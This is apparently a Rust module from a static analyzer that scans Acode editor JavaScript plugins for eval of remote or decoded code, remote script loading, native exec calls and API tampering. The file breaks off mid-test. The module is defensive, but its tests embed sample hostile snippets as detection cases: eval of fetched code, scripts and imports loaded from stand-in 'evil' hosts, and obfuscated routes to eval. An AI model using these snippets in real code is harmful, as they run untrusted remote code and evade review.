//! JavaScript analysis.
//!
//! Matching on raw names is both noisy and easy to dodge, so before any rule
//! runs this module works out what an expression really refers to:
//! - a local variable or parameter named `system` or `fetch` is not the global
//!   (oxc's semantic analysis tells locals from globals),
//! - `window.x`, `globalThis.x`, `self.x` are the same as `x`,
//! - `const f = acode.require("fs")`, `const { exec } = cordova`, and
//!   `const w = window` are followed,
//! - constant strings are folded: `window["ev" + "al"]`, `atob("ZXZhbA==")`,
//!   `String.fromCharCode(...)`, and `[..].join("")` all become plain names,
//! - values built from `fetch` responses or decoders are tracked one hop, so
//!   `eval(await res.text())` is recognised as running remote code.

use std::collections::{HashMap, HashSet};

use base64::Engine;
use oxc_allocator::Allocator;
use oxc_ast::ast::{
    Argument, ArrayExpression, ArrayExpressionElement, AssignmentExpression, AssignmentTarget,
    BinaryOperator, BindingPattern, CallExpression, ChainElement, Expression, IdentifierReference,
    ImportExpression, LogicalOperator, MemberExpression, NewExpression, StaticMemberExpression,
    StringLiteral, TemplateLiteral, VariableDeclarator,
};
use oxc_ast_visit::{Visit, walk};
use oxc_parser::Parser;
use oxc_semantic::{Scoping, SemanticBuilder, SymbolId};
use oxc_span::{GetSpan, SourceType, Span};

use crate::{
    rules::{self, Arg, Call, GLOBAL_OBJECTS, RuleContext},
    severity::{Category, Severity},
};

const MAX_DEPTH: u8 = 24;
const MAX_FOLDED_LEN: usize = 64 * 1024;

pub struct ParseOutcome {
    pub errors: Vec<String>,
    pub panicked: bool,
}

pub fn analyze(ctx: &mut RuleContext<'_>) -> ParseOutcome {
    rules::scan_source_text(ctx);

    let allocator = Allocator::default();
    let parsed = Parser::new(&allocator, ctx.source, SourceType::unambiguous()).parse();
    let semantic = SemanticBuilder::new().build(&parsed.program).semantic;

    let mut resolver = Resolver::new(semantic.scoping());
    // Two passes so aliases declared after first use still resolve.
    for _ in 0..2 {
        AliasCollector {
            resolver: &mut resolver,
        }
        .visit_program(&parsed.program);
    }

    Scanner {
        ctx,
        resolver: &resolver,
        remote_callback_depth: 0,
    }
    .visit_program(&parsed.program);

    ParseOutcome {
        errors: parsed
            .errors
            .iter()
            .take(5)
            .map(|error| error.to_string())
            .collect(),
        panicked: parsed.panicked,
    }
}

struct Resolver<'s> {
    scoping: &'s Scoping,
    aliases: HashMap<SymbolId, String>,
    strings: HashMap<SymbolId, String>,
    remote: HashSet<SymbolId>,
    decoded: HashSet<SymbolId>,
}

impl<'s> Resolver<'s> {
    fn new(scoping: &'s Scoping) -> Self {
        Self {
            scoping,
            aliases: HashMap::new(),
            strings: HashMap::new(),
            remote: HashSet::new(),
            decoded: HashSet::new(),
        }
    }

    /// `None` means the name is a global (unresolved reference).
    fn symbol(&self, ident: &IdentifierReference<'_>) -> Option<SymbolId> {
        let reference = ident.reference_id.get()?;
        self.scoping.get_reference(reference).symbol_id()
    }

    fn ident_path(&self, ident: &IdentifierReference<'_>) -> Option<String> {
        match self.symbol(ident) {
            Some(symbol) => self.aliases.get(&symbol).cloned(),
            None => {
                let name = ident.name.as_str();
                Some(if GLOBAL_OBJECTS.contains(&name) {
                    "$global".to_string()
                } else {
                    name.to_string()
                })
            }
        }
    }

    fn resolve(&self, expr: &Expression<'_>) -> Option<String> {
        self.resolve_at(expr, 0)
    }

    fn resolve_at(&self, expr: &Expression<'_>, depth: u8) -> Option<String> {
        if depth > MAX_DEPTH {
            return None;
        }
        match expr.get_inner_expression() {
            Expression::Identifier(ident) => self.ident_path(ident),
            Expression::StaticMemberExpression(member) => Some(join(
                &self.resolve_at(&member.object, depth + 1)?,
                member.property.name.as_str(),
            )),
            Expression::ComputedMemberExpression(member) => Some(join(
                &self.resolve_at(&member.object, depth + 1)?,
                &self.fold_at(&member.expression, depth + 1)?,
            )),
            Expression::ChainExpression(chain) => match &chain.expression {
                ChainElement::CallExpression(call) => self.call_result(call, depth + 1),
                ChainElement::StaticMemberExpression(member) => Some(join(
                    &self.resolve_at(&member.object, depth + 1)?,
                    member.property.name.as_str(),
                )),
                ChainElement::ComputedMemberExpression(member) => Some(join(
                    &self.resolve_at(&member.object, depth + 1)?,
                    &self.fold_at(&member.expression, depth + 1)?,
                )),
                _ => None,
            },
            // Bundlers emit `(0, fn)(...)` to drop `this`.
            Expression::SequenceExpression(sequence) => {
                self.resolve_at(sequence.expressions.last()?, depth + 1)
            }
            Expression::CallExpression(call) => self.call_result(call, depth + 1),
            // `window.acode || {}` and `globalThis.x ?? y`
            Expression::LogicalExpression(logical)
                if matches!(
                    logical.operator,
                    LogicalOperator::Or | LogicalOperator::Coalesce
                ) =>
            {
                self.resolve_at(&logical.left, depth + 1)
            }
            _ => None,
        }
    }

    fn member_path(&self, member: &MemberExpression<'_>) -> Option<String> {
        match member {
            MemberExpression::StaticMemberExpression(member) => Some(join(
                &self.resolve(&member.object)?,
                member.property.name.as_str(),
            )),
            MemberExpression::ComputedMemberExpression(member) => Some(join(
                &self.resolve(&member.object)?,
                &self.fold(&member.expression)?,
            )),
            MemberExpression::PrivateFieldExpression(_) => None,
        }
    }

    /// What a call evaluates to, for chaining: `acode.require("fs")` is the
    /// fs module, `fsOperation(url)` is a file handle, and so on.
    fn call_result(&self, call: &CallExpression<'_>, depth: u8) -> Option<String> {
        let callee = self.resolve_at(&call.callee, depth + 1)?;
        let first = call
            .arguments
            .first()
            .and_then(Argument::as_expression)
            .and_then(|expr| self.fold_at(expr, depth + 1));
        Some(match callee.as_str() {
            "acode.require" => match first {
                Some(name) => module_path(&name),
                None => "$module:?".to_string(),
            },
            "cordova.require" if first.as_deref() == Some("cordova/exec") => {
                "cordova.exec".to_string()
            }
            "fsOperation" => {
                // Keep the path's literal parts so rules can tell the plugin's
                // own folder from someone else's: `fsOperation(plugin_dir|x|main.js)`.
                let mut literals = Vec::new();
                let mut plugin_dir = false;
                for expr in call.arguments.iter().filter_map(Argument::as_expression) {
                    let probe = self.probe(expr);
                    plugin_dir |= probe.plugin_dir();
                    literals.extend(probe.literals);
                }
                if plugin_dir {
                    format!(
                        "fsOperation(plugin_dir|{})",
                        literals.join("|").replace(").", ")_")
                    )
                } else {
                    "fsOperation()".to_string()
                }
            }
            "document.createElement" => {
                format!(
                    "$element:{}",
                    first.unwrap_or_default().to_ascii_lowercase()
                )
            }
            other => format!("{other}()"),
        })
    }

    fn fold(&self, expr: &Expression<'_>) -> Option<String> {
        self.fold_at(expr, 0)
    }

    /// Fully constant string value of an expression.
    fn fold_at(&self, expr: &Expression<'_>, depth: u8) -> Option<String> {
        if depth > MAX_DEPTH {
            return None;
        }
        let value = match expr.get_inner_expression() {
            Expression::StringLiteral(string) => string.value.to_string(),
            Expression::NumericLiteral(number) => format_number(number.value),
            Expression::TemplateLiteral(template) => {
                let mut out = String::new();
                for (index, quasi) in template.quasis.iter().enumerate() {
                    out.push_str(quasi.value.cooked.unwrap_or(quasi.value.raw).as_str());
                    if let Some(expr) = template.expressions.get(index) {
                        out.push_str(&self.fold_at(expr, depth + 1)?);
                    }
                }
                out
            }
            Expression::BinaryExpression(binary) if binary.operator == BinaryOperator::Addition => {
                let left = self.fold_at(&binary.left, depth + 1)?;
                let right = self.fold_at(&binary.right, depth + 1)?;
                left + &right
            }
            Expression::Identifier(ident) => self.strings.get(&self.symbol(ident)?)?.clone(),
            Expression::CallExpression(call) => self.fold_call(call, depth + 1)?,
            _ => return None,
        };
        (value.len() <= MAX_FOLDED_LEN).then_some(value)
    }

    fn fold_call(&self, call: &CallExpression<'_>, depth: u8) -> Option<String> {
        let arg = |index: usize| {
            call.arguments
                .get(index)
                .and_then(Argument::as_expression)
                .and_then(|expr| self.fold_at(expr, depth + 1))
        };
        match self.resolve_at(&call.callee, depth + 1).as_deref() {
            Some("atob") => {
                let bytes = base64::engine::general_purpose::STANDARD
                    .decode(arg(0)?.trim())
                    .ok()?;
                // atob returns a "binary string": one char per byte.
                return Some(bytes.into_iter().map(char::from).collect());
            }
            Some("String.fromCharCode") => {
                return call
                    .arguments
                    .iter()
                    .map(
                        |argument| match argument.as_expression()?.get_inner_expression() {
                            Expression::NumericLiteral(number) => {
                                char::from_u32(number.value as u32)
                            }
                            _ => None,
                        },
                    )
                    .collect();
            }
            Some("decodeURIComponent" | "decodeURI" | "unescape") => {
                return percent_decode(&arg(0)?);
            }
            _ => {}
        }

        let Expression::StaticMemberExpression(member) = call.callee.get_inner_expression() else {
            return None;
        };
        match member.property.name.as_str() {
            "join" => {
                let separator = if call.arguments.is_empty() {
                    ",".to_string()
                } else {
                    arg(0)?
                };
                match member.object.get_inner_expression() {
                    Expression::ArrayExpression(array) => {
                        let parts = self.fold_array(array, depth + 1)?;
                        Some(parts.join(&separator))
                    }
                    // "lave".split("").reverse().join("")
                    Expression::CallExpression(inner) => {
                        let reversed = self.fold_split_reverse(inner, depth + 1)?;
                        Some(reversed.join(&separator))
                    }
                    _ => None,
                }
            }
            "concat" => {
                let mut out = self.fold_at(&member.object, depth + 1)?;
                for index in 0..call.arguments.len() {
                    out.push_str(&arg(index)?);
                }
                Some(out)
            }
            "toLowerCase" => Some(self.fold_at(&member.object, depth + 1)?.to_lowercase()),
            "toUpperCase" => Some(self.fold_at(&member.object, depth + 1)?.to_uppercase()),
            "trim" => Some(self.fold_at(&member.object, depth + 1)?.trim().to_string()),
            _ => None,
        }
    }

    fn fold_array(&self, array: &ArrayExpression<'_>, depth: u8) -> Option<Vec<String>> {
        array
            .elements
            .iter()
            .map(|element| self.fold_at(element.as_expression()?, depth + 1))
            .collect()
    }

    fn fold_split_reverse(&self, call: &CallExpression<'_>, depth: u8) -> Option<Vec<String>> {
        let Expression::StaticMemberExpression(reverse) = call.callee.get_inner_expression() else {
            return None;
        };
        if reverse.property.name.as_str() != "reverse" {
            return None;
        }
        let Expression::CallExpression(split) = reverse.object.get_inner_expression() else {
            return None;
        };
        let Expression::StaticMemberExpression(split_member) = split.callee.get_inner_expression()
        else {
            return None;
        };
        if split_member.property.name.as_str() != "split" {
            return None;
        }
        let text = self.fold_at(&split_member.object, depth + 1)?;
        let separator = split
            .arguments
            .first()
            .and_then(Argument::as_expression)
            .and_then(|expr| self.fold_at(expr, depth + 1))?;
        let mut parts: Vec<String> = if separator.is_empty() {
            text.chars().map(String::from).collect()
        } else {
            text.split(separator.as_str()).map(str::to_string).collect()
        };
        parts.reverse();
        Some(parts)
    }

    /// Partially known string: unknown parts become `…`. Used for commands
    /// and URLs where `${base}/api` is still informative.
    fn approx(&self, expr: &Expression<'_>, depth: u8) -> Option<String> {
        if depth > MAX_DEPTH {
            return None;
        }
        if let Some(value) = self.fold_at(expr, depth) {
            return Some(value);
        }
        match expr.get_inner_expression() {
            Expression::TemplateLiteral(template) => {
                let mut out = String::new();
                let mut has_literal = false;
                for (index, quasi) in template.quasis.iter().enumerate() {
                    let text = quasi.value.cooked.unwrap_or(quasi.value.raw);
                    has_literal |= !text.is_empty();
                    out.push_str(text.as_str());
                    if let Some(expr) = template.expressions.get(index) {
                        out.push_str(
                            &self
                                .approx(expr, depth + 1)
                                .unwrap_or_else(|| "…".to_string()),
                        );
                    }
                }
                has_literal.then_some(out)
            }
            Expression::BinaryExpression(binary) if binary.operator == BinaryOperator::Addition => {
                let left = self.approx(&binary.left, depth + 1);
                let right = self.approx(&binary.right, depth + 1);
                if left.is_none() && right.is_none() {
                    return None;
                }
                Some(
                    left.unwrap_or_else(|| "…".to_string())
                        + &right.unwrap_or_else(|| "…".to_string()),
                )
            }
            // spawnStream(["sh", "-c", cmd])
            Expression::ArrayExpression(array) => {
                let parts: Vec<String> = array
                    .elements
                    .iter()
                    .map(|element| {
                        element
                            .as_expression()
                            .and_then(|expr| self.approx(expr, depth + 1))
                            .unwrap_or_else(|| "…".to_string())
                    })
                    .collect();
                parts
                    .iter()
                    .any(|part| part != "…")
                    .then(|| parts.join(" "))
            }
            _ => None,
        }
    }

    fn probe(&self, expr: &Expression<'_>) -> FlowProbe<'_, 's> {
        let mut probe = FlowProbe::new(self);
        probe.visit_expression(expr);
        probe
    }

    fn arg_info(&self, expr: &Expression<'_>) -> Arg {
        let probe = self.probe(expr);
        let value = self.fold(expr);
        Arg {
            approx: if value.is_none() {
                self.approx(expr, 0)
            } else {
                None
            },
            value,
            decoded: probe.decoded,
            remote: probe.remote,
            is_function: matches!(
                expr.get_inner_expression(),
                Expression::FunctionExpression(_) | Expression::ArrowFunctionExpression(_)
            ),
            path: self.resolve(expr),
        }
    }

    fn argument_info(&self, argument: &Argument<'_>) -> Arg {
        match argument {
            Argument::SpreadElement(spread) => self.arg_info(&spread.argument),
            other => other
                .as_expression()
                .map(|expr| self.arg_info(expr))
                .unwrap_or_default(),
        }
    }
}

fn join(object: &str, property: &str) -> String {
    if object == "$global" {
        if GLOBAL_OBJECTS.contains(&property) {
            return "$global".to_string();
        }
        return canonical(property);
    }
    canonical(&format!("{object}.{property}"))
}

fn canonical(path: &str) -> String {
    match path {
        "acode.fsOperation" => "fsOperation".to_string(),
        "Function.prototype.constructor" => "Function".to_string(),
        "document.defaultView" => "$global".to_string(),
        path if path.ends_with("constructor.constructor") => {
            "$indirect_function_constructor".to_string()
        }
        path => path.to_string(),
    }
}

fn module_path(name: &str) -> String {
    match name.to_ascii_lowercase().as_str() {
        "fs" | "fsoperation" => "fsOperation".to_string(),
        lower => format!("$module:{lower}"),
    }
}

fn format_number(value: f64) -> String {
    if value.fract() == 0.0 && value.abs() < 1e15 {
        format!("{}", value as i64)
    } else {
        value.to_string()
    }
}

fn percent_decode(value: &str) -> Option<String> {
    let bytes = value.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut index = 0;
    while index < bytes.len() {
        if bytes[index] == b'%' && index + 2 < bytes.len() {
            let hex = std::str::from_utf8(&bytes[index + 1..index + 3]).ok()?;
            out.push(u8::from_str_radix(hex, 16).ok()?);
            index += 3;
        } else {
            out.push(bytes[index]);
            index += 1;
        }
    }
    String::from_utf8(out).ok()
}

/// Looks inside an expression for data that came from the network, from a
/// decoder, or that points at the plugins directory.
struct FlowProbe<'r, 's> {
    resolver: &'r Resolver<'s>,
    decoded: bool,
    remote: bool,
    plugin_dir_constant: bool,
    data_storage: bool,
    plugins_literal: bool,
    literals: Vec<String>,
}

impl<'r, 's> FlowProbe<'r, 's> {
    fn new(resolver: &'r Resolver<'s>) -> Self {
        Self {
            resolver,
            decoded: false,
            remote: false,
            plugin_dir_constant: false,
            data_storage: false,
            plugins_literal: false,
            literals: Vec::new(),
        }
    }

    fn plugin_dir(&self) -> bool {
        self.plugin_dir_constant || (self.data_storage && self.plugins_literal)
    }

    fn global_name(&mut self, name: &str) {
        match name {
            "atob" | "unescape" | "decodeURIComponent" | "TextDecoder" => self.decoded = true,
            "fetch" | "XMLHttpRequest" => self.remote = true,
            "PLUGIN_DIR" => self.plugin_dir_constant = true,
            "DATA_STORAGE" => self.data_storage = true,
            _ => {}
        }
    }
}

impl<'a> Visit<'a> for FlowProbe<'_, '_> {
    fn visit_identifier_reference(&mut self, it: &IdentifierReference<'a>) {
        match self.resolver.symbol(it) {
            Some(symbol) => {
                self.remote |= self.resolver.remote.contains(&symbol);
                self.decoded |= self.resolver.decoded.contains(&symbol);
                if let Some(alias) = self.resolver.aliases.get(&symbol) {
                    let alias = alias.clone();
                    self.global_name(&alias);
                }
            }
            None => self.global_name(it.name.as_str()),
        }
    }

    fn visit_static_member_expression(&mut self, it: &StaticMemberExpression<'a>) {
        match it.property.name.as_str() {
            "fromCharCode" => self.decoded = true,
            "responseText" => self.remote = true,
            name if GLOBAL_OBJECTS.iter().all(|global| *global != name) => {
                if matches!(
                    self.resolver.resolve(&it.object).as_deref(),
                    Some("$global")
                ) {
                    self.global_name(name);
                }
            }
            _ => {}
        }
        walk::walk_static_member_expression(self, it);
    }

    fn visit_string_literal(&mut self, it: &StringLiteral<'a>) {
        let value = it.value.as_str();
        if self.literals.len() < 8 && value.len() < 200 {
            self.literals.push(value.to_string());
        }
        if value == "plugins" || value.starts_with("plugins/") || value.contains("/plugins/") {
            self.plugins_literal = true;
        }
    }
}

struct AliasCollector<'r, 's> {
    resolver: &'r mut Resolver<'s>,
}

impl AliasCollector<'_, '_> {
    fn bind(
        &mut self,
        pattern: &BindingPattern<'_>,
        init: Option<&Expression<'_>>,
        path: Option<String>,
    ) {
        match pattern {
            BindingPattern::BindingIdentifier(binding) => {
                let Some(symbol) = binding.symbol_id.get() else {
                    return;
                };
                if self.resolver.scoping.symbol_is_mutated(symbol) {
                    return;
                }
                if let Some(path) = path {
                    self.resolver.aliases.insert(symbol, path);
                }
                if let Some(init) = init {
                    if let Some(value) = self.resolver.fold(init) {
                        self.resolver.strings.insert(symbol, value);
                    }
                    let probe = self.resolver.probe(init);
                    let (remote, decoded) = (probe.remote, probe.decoded);
                    if remote {
                        self.resolver.remote.insert(symbol);
                    }
                    if decoded {
                        self.resolver.decoded.insert(symbol);
                    }
                }
            }
            BindingPattern::ObjectPattern(object) => {
                let Some(path) = path else {
                    return;
                };
                for property in &object.properties {
                    if let Some(key) = property.key.static_name() {
                        self.bind(&property.value, None, Some(join(&path, &key)));
                    }
                }
            }
            BindingPattern::AssignmentPattern(assignment) => {
                self.bind(&assignment.left, init, path)
            }
            _ => {}
        }
    }
}

impl<'a> Visit<'a> for AliasCollector<'_, '_> {
    fn visit_variable_declarator(&mut self, it: &VariableDeclarator<'a>) {
        if let Some(init) = &it.init {
            let path = self.resolver.resolve(init);
            self.bind(&it.id, Some(init), path);
        }
        walk::walk_variable_declarator(self, it);
    }
}

struct Scanner<'c, 'a, 'r, 's> {
    ctx: &'c mut RuleContext<'a>,
    resolver: &'r Resolver<'s>,
    remote_callback_depth: usize,
}

impl Scanner<'_, '_, '_, '_> {
    fn callee_path(&self, callee: &Expression<'_>) -> String {
        if let Some(path) = self.resolver.resolve(callee) {
            return path;
        }
        match callee.get_inner_expression() {
            Expression::StaticMemberExpression(member) => {
                let name = member.property.name.as_str();
                let object = member.object.get_inner_expression();
                let indirect_constructor = name == "constructor"
                    && (matches!(
                        object,
                        Expression::FunctionExpression(_) | Expression::ArrowFunctionExpression(_)
                    ) || matches!(object, Expression::StaticMemberExpression(inner) if inner.property.name.as_str() == "constructor"));
                if indirect_constructor {
                    "$indirect_function_constructor".to_string()
                } else {
                    format!("$unknown.{name}")
                }
            }
            _ => "$unknown".to_string(),
        }
    }

    /// `fetch(url).then(r => r.text()).then(code => eval(code))`
    fn is_then_on_remote(&self, call: &CallExpression<'_>) -> bool {
        let Expression::StaticMemberExpression(member) = call.callee.get_inner_expression() else {
            return false;
        };
        member.property.name.as_str() == "then" && self.resolver.probe(&member.object).remote
    }

    fn classify(&mut self, path: &str, span: Span, args: &[Arg]) {
        rules::classify_call(
            self.ctx,
            &Call {
                path,
                span,
                args,
                in_remote_callback: self.remote_callback_depth > 0,
            },
        );
    }

    fn classify_assignment(&mut self, span: Span, target: &str, value: &Expression<'_>) {
        rules::classify_tamper_target(self.ctx, span, target, "assigns");

        let Some((element, property)) = target
            .strip_prefix("$element:")
            .and_then(|rest| rest.split_once('.'))
        else {
            return;
        };
        if element != "script" {
            return;
        }
        let info = self.resolver.arg_info(value);
        match property {
            "src" => {
                if info.text().is_some_and(rules::is_remote_url) {
                    self.ctx.add(
                        "dynamic.remote_script",
                        Severity::High,
                        Category::DynamicCode,
                        Some(span),
                        "Loads a <script> from a remote URL (code reviewers never see)",
                        info.text().unwrap_or_default(),
                    );
                }
            }
            "text" | "textContent" | "innerHTML" | "innerText" => {
                let (id, severity, message) = if info.remote || self.remote_callback_depth > 0 {
                    (
                        "dynamic.remote_code",
                        Severity::Critical,
                        "Runs downloaded code through an inline <script>",
                    )
                } else if info.decoded {
                    (
                        "dynamic.decoded_exec",
                        Severity::High,
                        "Runs decoded text through an inline <script>",
                    )
                } else if info.value.is_some() {
                    return;
                } else {
                    (
                        "dynamic.inline_script",
                        Severity::Medium,
                        "Fills an inline <script> with code built at runtime",
                    )
                };
                let evidence = self.ctx.snippet(span);
                self.ctx.add(
                    id,
                    severity,
                    Category::DynamicCode,
                    Some(span),
                    message,
                    evidence,
                );
            }
            _ => {}
        }
    }
}

impl<'a> Visit<'a> for Scanner<'_, '_, '_, '_> {
    fn visit_call_expression(&mut self, it: &CallExpression<'a>) {
        let path = self.callee_path(&it.callee);
        let args: Vec<Arg> = it
            .arguments
            .iter()
            .map(|argument| self.resolver.argument_info(argument))
            .collect();
        self.classify(&path, it.span, &args);

        let remote_then = self.is_then_on_remote(it);
        if remote_then {
            // `.then(eval)` / `.then(Function)`
            for arg in &args {
                if matches!(arg.path.as_deref(), Some("eval" | "Function")) {
                    let remote = Arg {
                        remote: true,
                        ..Arg::default()
                    };
                    self.classify(arg.path.as_deref().unwrap_or("eval"), it.span, &[remote]);
                }
            }
            self.remote_callback_depth += 1;
        }
        walk::walk_call_expression(self, it);
        if remote_then {
            self.remote_callback_depth -= 1;
        }
    }

    fn visit_new_expression(&mut self, it: &NewExpression<'a>) {
        let path = self.callee_path(&it.callee);
        let args: Vec<Arg> = it
            .arguments
            .iter()
            .map(|argument| self.resolver.argument_info(argument))
            .collect();
        self.classify(&path, it.span, &args);
        walk::walk_new_expression(self, it);
    }

    fn visit_import_expression(&mut self, it: &ImportExpression<'a>) {
        let source = self.resolver.arg_info(&it.source);
        rules::classify_import(self.ctx, it.span, Some(&source));
        walk::walk_import_expression(self, it);
    }

    fn visit_assignment_expression(&mut self, it: &AssignmentExpression<'a>) {
        let target = match &it.left {
            AssignmentTarget::AssignmentTargetIdentifier(ident) => {
                if self.resolver.symbol(ident).is_none() {
                    Some(ident.name.to_string())
                } else {
                    None
                }
            }
            other => other
                .as_member_expression()
                .and_then(|member| self.resolver.member_path(member)),
        };
        if let Some(target) = target {
            self.classify_assignment(it.span, &target, &it.right);
        }
        walk::walk_assignment_expression(self, it);
    }

    fn visit_identifier_reference(&mut self, it: &IdentifierReference<'a>) {
        if self.resolver.symbol(it).is_none() {
            rules::classify_reference(self.ctx, it.name.as_str(), it.span);
        }
    }

    fn visit_member_expression(&mut self, it: &MemberExpression<'a>) {
        if let Some(path) = self.resolver.member_path(it) {
            rules::classify_reference(self.ctx, &path, it.span());
        }
        walk::walk_member_expression(self, it);
    }

    fn visit_string_literal(&mut self, it: &StringLiteral<'a>) {
        rules::classify_string(self.ctx, it.value.as_str(), it.span);
    }

    fn visit_template_literal(&mut self, it: &TemplateLiteral<'a>) {
        for quasi in &it.quasis {
            let text = quasi.value.cooked.unwrap_or(quasi.value.raw);
            rules::classify_string(self.ctx, text.as_str(), quasi.span);
        }
        walk::walk_template_literal(self, it);
    }

    fn visit_array_expression(&mut self, it: &ArrayExpression<'a>) {
        let total = it.elements.len();
        if total > 40 {
            let hex_like = it
                .elements
                .iter()
                .filter(|element| is_hex_like(element))
                .count();
            rules::classify_hex_array(self.ctx, it.span, total, hex_like);
        }
        walk::walk_array_expression(self, it);
    }
}

fn is_hex_like(element: &ArrayExpressionElement<'_>) -> bool {
    match element {
        ArrayExpressionElement::NumericLiteral(number) => number
            .raw
            .as_ref()
            .is_some_and(|raw| raw.as_str().starts_with("0x") || raw.as_str().starts_with("0X")),
        ArrayExpressionElement::StringLiteral(string) => {
            let value = string.value.as_str();
            value.len() > 2
                && value.starts_with("0x")
                && value[2..].chars().all(|ch| ch.is_ascii_hexdigit())
        }
        _ => false,
    }
}

/// Blanks everything outside inline `<script>` blocks so spans and line
/// numbers still point into the original HTML file. Returns the JS view and
/// any remote `<script src>` URLs.
pub fn html_scripts(html: &str) -> (String, Vec<String>) {
    let lower = html.to_ascii_lowercase();
    let mut js: Vec<u8> = html
        .bytes()
        .map(|byte| if byte == b'\n' { b'\n' } else { b' ' })
        .collect();
    let mut remote = Vec::new();
    let mut index = 0;
    while let Some(offset) = lower[index..].find("<script") {
        let tag_start = index + offset;
        let Some(tag_len) = lower[tag_start..].find('>') else {
            break;
        };
        let tag_end = tag_start + tag_len + 1;
        let tag = &html[tag_start..tag_end];
        if let Some(src) = attribute(tag, "src")
            && rules::is_remote_url(&src)
        {
            remote.push(src);
        }
        let Some(close) = lower[tag_end..].find("</script") else {
            break;
        };
        let body_end = tag_end + close;
        js[tag_end..body_end].copy_from_slice(&html.as_bytes()[tag_end..body_end]);
        index = body_end;
    }
    (String::from_utf8(js).unwrap_or_default(), remote)
}

fn attribute(tag: &str, name: &str) -> Option<String> {
    let lower = tag.to_ascii_lowercase();
    let start = lower.find(&format!("{name}="))? + name.len() + 1;
    let rest = &tag[start..];
    let value = match rest.chars().next()? {
        quote @ ('"' | '\'') => rest[1..].split(quote).next()?,
        _ => rest
            .split(|ch: char| ch.is_whitespace() || ch == '>')
            .next()?,
    };
    Some(value.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn findings(source: &str) -> Vec<(String, Severity)> {
        findings_for(source, Some("com.example.test"))
    }

    fn findings_for(source: &str, plugin_id: Option<&str>) -> Vec<(String, Severity)> {
        let mut ctx = RuleContext::new("main.js", source, plugin_id);
        analyze(&mut ctx);
        ctx.findings
            .into_iter()
            .map(|finding| (finding.id, finding.severity))
            .collect()
    }

    fn ids(source: &str) -> Vec<String> {
        findings(source).into_iter().map(|(id, _)| id).collect()
    }

    fn has(source: &str, id: &str) -> bool {
        ids(source).iter().any(|found| found == id)
    }

    #[test]
    fn local_names_do_not_match_globals() {
        assert!(!has(
            "function f(system){ system.requestPermission('x') }",
            "native.permission_request"
        ));
        assert!(!has(
            "const fetch = () => 1; fetch('https://a.b')",
            "network.fetch"
        ));
        assert!(!has(
            "function g(e){ e.read(); e.copy(); e.delete(); e.moveTo() }",
            "filesystem.write"
        ));
        assert!(has(
            "system.requestPermission('android.permission.CAMERA')",
            "native.permission_request"
        ));
    }

    #[test]
    fn resolves_window_prefix_and_aliases() {
        assert!(has("window.Executor.execute('ls')", "shell.exec"));
        assert!(has(
            "const w = window; w.Executor.execute('ls')",
            "shell.exec"
        ));
        assert!(has(
            "const { Executor: E } = window; E.execute('ls')",
            "shell.exec"
        ));
        assert!(has(
            "const fs = acode.require('fs'); fs(url).writeFile('x')",
            "filesystem.write"
        ));
        assert!(has(
            "const t = acode.require('Terminal')",
            "shell.terminal_module"
        ));
    }

    #[test]
    fn folds_constant_strings() {
        assert!(has("window['ev' + 'al'](x)", "dynamic.eval"));
        assert!(has("window[atob('ZXZhbA==')](x)", "dynamic.eval"));
        assert!(has(
            "globalThis[String.fromCharCode(101,118,97,108)](x)",
            "dynamic.eval"
        ));
        assert!(has("window[['e','v','a','l'].join('')](x)", "dynamic.eval"));
        assert!(has(
            "window['lave'.split('').reverse().join('')](x)",
            "dynamic.eval"
        ));
        assert!(has("const n = 'eval'; window[n](x)", "dynamic.eval"));
    }

    #[test]
    fn ignores_bundler_global_lookup() {
        assert!(!has(
            "var g = Function('return this')()",
            "dynamic.function_constructor"
        ));
        assert!(!has(
            "var g = new Function('return this')()",
            "dynamic.function_constructor"
        ));
    }

    #[test]
    fn grades_code_execution_by_source() {
        let sev = |source: &str| {
            findings(source)
                .into_iter()
                .filter(|(id, _)| id.starts_with("dynamic."))
                .map(|(_, severity)| severity)
                .max()
        };
        assert_eq!(sev("eval(userCode)"), Some(Severity::Medium));
        assert_eq!(sev("eval(atob(payload))"), Some(Severity::High));
        assert_eq!(
            sev("const s = atob(p); new Function(s)()"),
            Some(Severity::High)
        );
        assert_eq!(
            sev(
                "async function f(){ const r = await fetch(u); const c = await r.text(); eval(c) }"
            ),
            Some(Severity::Critical)
        );
        assert_eq!(
            sev("fetch(u).then(r => r.text()).then(c => eval(c))"),
            Some(Severity::Critical)
        );
        assert_eq!(
            sev("fetch(u).then(r => r.text()).then(eval)"),
            Some(Severity::Critical)
        );
        assert_eq!(
            sev("x.onload = () => eval(x.responseText)"),
            Some(Severity::Critical)
        );
    }

    #[test]
    fn detects_remote_scripts_and_imports() {
        assert!(has(
            "const s = document.createElement('script'); s.src = 'https://cdn.evil/x.js'; document.head.append(s)",
            "dynamic.remote_script"
        ));
        assert!(!has(
            "const s = document.createElement('script'); s.src = baseUrl + 'chunk.js'",
            "dynamic.remote_script"
        ));
        assert!(has("import('https://e.vil/m.js')", "dynamic.remote_import"));
        assert!(has(
            "(function(){}).constructor('alert(1)')()",
            "dynamic.indirect_function_constructor"
        ));
        assert!(has(
            "[].constructor.constructor('alert(1)')()",
            "dynamic.indirect_function_constructor"
        ));
    }

    #[test]
    fn grades_cordova_exec_by_service() {
        assert!(has(
            "cordova.exec(a, b, 'Tee', 'requestToken', [])",
            "native.plugin_context_bridge"
        ));
        assert!(has(
            "cordova.exec(a, b, 'System', 'writeText', [])",
            "native.cordova_exec"
        ));
        assert!(has(
            "cordova.exec(a, b, svc, act, [])",
            "native.cordova_exec_dynamic"
        ));
        assert!(has(
            "const exec = cordova.require('cordova/exec'); exec(a, b, 'Tee', 'x', [])",
            "native.plugin_context_bridge"
        ));
        assert!(!has(
            "cordova.plugins.clipboard.copy('x')",
            "native.cordova_exec"
        ));
    }

    #[test]
    fn detects_tampering() {
        assert!(has(
            "acode.define('fs', evil)",
            "tampering.core_module_override"
        ));
        assert!(has(
            "acode.define('FS', evil)",
            "tampering.core_module_override"
        ));
        assert!(!has(
            "acode.define('myPluginApi', api)",
            "tampering.core_module_override"
        ));
        assert!(has("acode.require = function(){}", "tampering.acode_api"));
        assert!(has(
            "Object.defineProperty(window.acode, 'require', {})",
            "tampering.acode_api"
        ));
        assert!(has("window.fetch = hooked", "tampering.network_hook"));
        assert!(has(
            "XMLHttpRequest.prototype.send = hooked",
            "tampering.network_hook"
        ));
        assert!(has(
            "acode.setPluginInit('other.plugin', init)",
            "tampering.other_plugin"
        ));
        assert!(!has(
            "acode.setPluginInit('com.example.test', init)",
            "tampering.other_plugin"
        ));
        assert!(has(
